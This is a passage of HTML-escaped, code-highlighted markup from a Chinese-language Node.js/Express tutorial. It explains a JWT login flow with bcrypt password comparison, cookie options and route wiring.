&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../middlewares/isAuthenticated&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/verify&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;verifyAccount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这两组代码的作用是：
当用户向/verify路由发送请求时，isAuthenticated中间件首先运行。它检查cookie或授权头中是否存在有效令牌。如果未找到令牌，它会抛出错误：您未登录。请登录以访问此资源。&lt;/p&gt;
&lt;p&gt;如果找到令牌，它会验证令牌并检查关联的用户是否仍然存在。如果不存在，则抛出另一个错误：&amp;ldquo;与此令牌关联的用户不再存在。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;如果用户存在且令牌有效，则他们的详细信息将附加到请求(req.user)。然后请求继续进行到verifyAccount控制器，该控制器处理OTP验证。&lt;/p&gt;
&lt;p&gt;您可以使用Postman测试此端点，发送POST请求到：http://localhost:8000/api/v1/users/verify&lt;/p&gt;
&lt;p&gt;上面的图像显示验证令牌功能正常工作，并显示状态码200。&lt;/p&gt;
&lt;h3 id=&#34;登录功能&#34;&gt;登录功能
&lt;/h3&gt;&lt;p&gt;如果您已到达这一点，您已成功注册并验证了用户账户。&lt;/p&gt;
&lt;p&gt;现在是时候创建登录功能，它允许已验证的用户访问其账户。以下是您可以做到这一点的方法：&lt;/p&gt;
&lt;p&gt;转到您的authController.js文件并通过添加以下内容创建您的登录函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;login&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 1. 验证电子邮件和密码是否存在
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;请提供电子邮件和密码&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 2. 检查用户是否存在并包含密码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findOne&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;correctPassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;电子邮件或密码不正确&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 3. 创建JWT令牌
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;signToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 4. 配置cookie选项
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cookieOptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;expires&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;parseInt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JWT_COOKIE_EXPIRES_IN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;90&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;httpOnly&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// secure: process.env.NODE_ENV === &amp;#34;production&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// sameSite: process.env.NODE_ENV === &amp;#34;production&amp;#34; ?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//  &amp;#34;None&amp;#34; : &amp;#34;Lax&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//在本地HTTP和跨源期间或设置为false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;sameSite&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Lax&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 5. 发送cookie
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cookieOptions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;if (!email || !password) {…}&lt;/code&gt;检查用户是否实际提供了电子邮件和密码。如果没有，它返回错误：请提供电子邮件和密码&amp;quot;, 400。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;const user = await User.findOne({ email }).select(&amp;quot;+password&amp;quot;);&lt;/code&gt;在数据库中搜索具有提供的电子邮件的用户，并明确包含密码字段，因为它在模式中通常默认隐藏。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;if (!user || !(await user.correctPassword(…))) {…}&lt;/code&gt;检查用户是否存在以及输入的密码是否与数据库中存储的密码匹配(在哈希比较之后)。如果任一错误，它会抛出：电子邮件或密码不正确。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;signToken(user._id)&lt;/code&gt;行使用用户的唯一ID生成JWT。cookieOptions对象配置cookie的行为 - 它设置cookie在.env文件中定义的天数后过期，将其标记为httpOnly以防止JavaScript访问以提高安全性，将secure设置为false因为应用当前处于开发中，并使用sameSite: &amp;ldquo;Lax&amp;quot;以允许在本地测试期间进行跨源请求。&lt;/p&gt;
&lt;p&gt;最后，&lt;code&gt;res.cookie(...)&lt;/code&gt;将令牌作为附加到HTTP响应的cookie发送，使客户端能够存储令牌以用于认证目的。&lt;/p&gt;
&lt;p&gt;从上面的代码中，您可能已经注意到数据库中存储的密码是出于安全原因进行哈希处理的。这意味着当用户登录时，它与用户的密码看起来完全不同。因此，即使用户输入了正确的密码，它也不会通过简单的比较直接匹配存储的哈希。&lt;/p&gt;
&lt;p&gt;要解决此问题，您需要使用bcryptjs包将输入的密码与哈希密码进行比较。&lt;/p&gt;
&lt;p&gt;转到您的userModel.js文件并创建一个处理密码比较的方法。此方法将获取用户提供的纯文本密码并将其与数据库中存储的哈希密码进行比较。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//userModel.js
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//创建一个负责比较数据库中存储的密码的方法
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;userSchema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;correctPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userPassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bcrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;compare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userPassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此correctPassword方法使用bcrypt.compare()，它在内部哈希纯密码并检查它是否与存储的哈希版本匹配。这确保登录验证正确且安全地工作，即使实际密码不以纯文本形式存储。&lt;/p&gt;
&lt;p&gt;接下来，将登录功能添加到userRouter.js文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../controller/authController&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
